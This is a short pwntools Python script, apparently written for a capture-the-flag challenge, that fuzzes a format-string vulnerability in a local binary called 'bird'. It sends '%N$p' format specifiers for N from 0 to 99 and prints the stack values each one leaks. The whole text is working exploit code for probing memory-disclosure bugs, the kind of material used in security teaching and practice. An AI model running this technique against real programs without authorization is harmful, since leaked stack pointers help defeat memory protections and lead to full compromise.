from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./bird', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(b':', 'c56500c7ab26a5100d4672cf18835690 c56500c7ab26a5100d4672cf18835690 %{}$p'.format(i).encode())
        sleep(0.1)
        p.recvuntil(b'singing:')
        # Receive the response
        result = p.recvlinesS(2)[0].split(" ")[-1:]
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
